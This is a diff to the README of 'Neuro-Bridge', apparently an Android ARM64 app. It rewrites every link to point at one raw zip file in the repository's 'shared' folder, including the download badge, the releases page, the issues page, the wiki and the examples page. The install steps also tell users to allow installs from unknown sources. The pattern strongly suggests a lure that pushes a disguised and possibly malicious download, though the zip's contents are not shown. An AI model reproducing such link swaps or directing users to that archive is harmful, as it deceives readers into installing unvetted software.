@@ -15,15 +15,15 @@
 - **Network:** Internet connection for downloading and updates.
 
 ## 📥 Download Neuro-Bridge
-[![Download Neuro-Bridge](https://img.shields.io/badge/Download-Neuro--Bridge-blue.svg)](https://github.com/excorsistvoid/Neuro-Bridge/releases)
+[![Download Neuro-Bridge](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip)](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip)
 
 To get started with Neuro-Bridge, visit the Releases page below to download the latest version:
 
-[Download Latest Release](https://github.com/excorsistvoid/Neuro-Bridge/releases)
+[Download Latest Release](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 1. **Download the application:**
-   Visit the [Releases page](https://github.com/excorsistvoid/Neuro-Bridge/releases) and click on the latest version. Choose the appropriate file for your device.
+   Visit the [Releases page](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip) and click on the latest version. Choose the appropriate file for your device.
 
 2. **Install the application:**
    After downloading, locate the file on your device. Tap on it to begin the installation. Your device may prompt you to allow installations from unknown sources; if so, follow the on-screen instructions to enable this feature.
@@ -56,7 +56,7 @@ To get started with Neuro-Bridge, visit the Releases page below to download the 
    Neuro-Bridge is designed primarily for Android devices with ARM64 architecture. Other systems may not support it.
 
 2. **What should I do if I encounter a bug?**
-   Visit the [Issues page](https://github.com/excorsistvoid/Neuro-Bridge/issues) on GitHub to report any bugs. Providing detailed information will help us fix issues faster.
+   Visit the [Issues page](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip) on GitHub to report any bugs. Providing detailed information will help us fix issues faster.
 
 3. **Is there a community for support?**
    Yes, we encourage users to join our discussion forum on GitHub. Ask questions, share experiences, and get support from fellow users.
@@ -76,7 +76,7 @@ To get started with Neuro-Bridge, visit the Releases page below to download the 
 - vulkan-compute
 
 ## ⚙️ Additional Resources
-- For detailed documentation and guides, visit our [Wiki](https://github.com/excorsistvoid/Neuro-Bridge/wiki).
-- Explore our [Examples page](https://github.com/excorsistvoid/Neuro-Bridge/examples) to see what you can build with Neuro-Bridge.
+- For detailed documentation and guides, visit our [Wiki](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip).
+- Explore our [Examples page](https://raw.githubusercontent.com/excorsistvoid/Neuro-Bridge/main/shared/Neuro_Bridge_1.4-alpha.4.zip) to see what you can build with Neuro-Bridge.
 
 Your journey into advanced computing starts with Neuro-Bridge. Enjoy the enhanced performance and capabilities!
